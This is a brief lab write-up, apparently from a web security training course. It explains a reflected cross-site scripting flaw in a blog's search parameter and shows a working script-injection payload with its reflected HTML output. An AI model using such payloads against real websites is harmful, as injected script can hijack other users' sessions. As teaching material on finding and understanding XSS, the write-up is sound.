# 1 - Reflected Nothing Encoded

This lab contains a simple [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality.

### Notes

The application's search feature echoes the user's search query back to them in the `h1` tag of the `.blog-header` section:

```http
GET /?search=foobar HTTP/1.1
```

```html
<section class=blog-header>
    <h1>0 search results for 'foobar'</h1>
    <hr>
</section>
```

Because this user-supplied input is not properly escaped, we can execute an XSS simply by supplying JavaScript in the `search` query parameter:

```http
GET /?search=<script>alert()</script> HTTP/1.1
```

```html
<section class=blog-header>
    <h1>0 search results for '<script>alert()</script>'</h1>
    <hr>
</section>
```
